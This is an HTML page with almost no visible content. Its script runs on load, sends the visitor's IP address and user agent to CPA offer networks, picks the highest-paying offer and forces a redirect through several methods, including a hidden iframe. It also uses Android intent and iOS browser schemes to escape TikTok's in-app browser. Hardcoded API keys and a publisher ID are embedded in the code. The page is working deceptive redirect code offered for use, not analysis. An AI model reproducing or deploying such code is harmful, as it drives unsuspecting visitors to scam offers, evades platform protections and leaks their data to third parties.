<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>...</title>
  <meta name="referrer" content="origin">
  <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
  <link rel="canonical" href="#">
</head>
<body>
  <div style="text-align:center; margin-top: 40vh; font-family: Arial, sans-serif; font-size: 20px;">
    â€¦
  </div>

  <script>
    function getEnv() {
      const ua = navigator.userAgent.toLowerCase();
      return {
        isAndroid: ua.includes("android"),
        isIOS: /iphone|ipad|ipod/.test(ua),
        isTikTok: /(tiktok|tiktok_lite|tiktoklite|musical_ly|douyin)/.test(ua)
      };
    }

    function attemptRedirect(url) {
      try { window.location.href = url; } catch {}
      try { window.location.replace(url); } catch {}
      try { window.open(url, "_blank"); } catch {}
      const iframe = document.createElement("iframe");
      iframe.style.display = "none";
      iframe.src = url;
      document.body.appendChild(iframe);
    }

    async function fetchOgadsMax() {
      const apiKey = "34829|nJfCK9PNtqv8s0cqEl943LhDfd3ufQMGcNc2ZdCT429ec4af";
      try {
        const ipRes = await fetch("https://api.ipify.org?format=json");
        const ipData = await ipRes.json();
        const apiUrl = new URL("https://unlockcontent.net/api/v2");
        apiUrl.searchParams.append("ip", ipData.ip);
        apiUrl.searchParams.append("user_agent", navigator.userAgent);
        apiUrl.searchParams.append("limit", "1000");
        apiUrl.searchParams.append("ctype", "0");

        const res = await fetch(apiUrl, { headers: { Authorization: `Bearer ${apiKey}` } });
        if (!res.ok) throw new Error("OGAds fetch failed");
        const data = await res.json();
        const offers = data.offers || [];
        let maxOffer = null;
        let maxPayout = -1;

        offers.forEach(o => {
          const payout = parseFloat(o.payout) || 0;
          if (payout > maxPayout) {
            maxPayout = payout;
            maxOffer = {
              url: o.link || o.click_url || o.offer_url || o.url,
              payout: payout
            };
          }
        });
        return maxOffer;
      } catch (err) {
        console.error("OGAds error:", err);
        return null;
      }
    }

    async function fetchCpagripMax() {
      const url = "https://www.cpagrip.com/common/offer_feed_json.php?user_id=2439739&pubkey=23311a81282b777eab88a6d19f0d9493&tracking_id=";
      try {
        const res = await fetch(url);
        const data = await res.json();
        const offers = data.offers || data;
        let maxOffer = null;
        let maxPayout = -1;

        if (offers && offers.length) {
          offers.forEach(o => {
            const payout = parseFloat(o.default_payout) || 0;
            if (payout > maxPayout) {
              maxPayout = payout;
              maxOffer = {
                url: o.offerlink || o.offer_url,
                payout: payout
              };
            }
          });
        }
        return maxOffer;
      } catch (err) {
        console.error("CPA Grip error:", err);
        return null;
      }
    }

    async function getBestOfferUrl() {
      const [ogadsOffer, cpaOffer] = await Promise.all([fetchOgadsMax(), fetchCpagripMax()]);
      if (!ogadsOffer && !cpaOffer) {
        return null; // no fallback
      }
      if (!ogadsOffer) return cpaOffer.url;
      if (!cpaOffer) return ogadsOffer.url;
      return ogadsOffer.payout >= cpaOffer.payout ? ogadsOffer.url : cpaOffer.url;
    }

    async function redirectTikTok() {
      const targetUrl = await getBestOfferUrl();
      if (!targetUrl) return; // stop if no offers

      const env = getEnv();
      if (!env.isTikTok) {
        attemptRedirect(targetUrl);
        return;
      }

      if (env.isAndroid) {
        const intents = [
          `intent://${targetUrl.replace("https://", "")}#Intent;scheme=https;package=com.android.chrome;end`,
          `intent://${targetUrl.replace("https://", "")}#Intent;scheme=http;package=com.android.chrome;end`,
          `intent://${targetUrl.replace("https://", "")}#Intent;scheme=https;package=com.google.android.webview;end`,
          `intent://${targetUrl.replace("https://", "")}#Intent;scheme=https;end`
        ];
        intents.forEach(url => attemptRedirect(url));
      } else if (env.isIOS) {
        const iosSchemes = [
          `googlechromes://${targetUrl.replace("https://", "")}`,
          `safari://${targetUrl.replace("https://", "")}`
        ];
        iosSchemes.forEach(url => attemptRedirect(url));
      }

      setTimeout(() => attemptRedirect(targetUrl), 2000);
    }

    setTimeout(redirectTikTok, 100);
  </script>
</body>
</html>


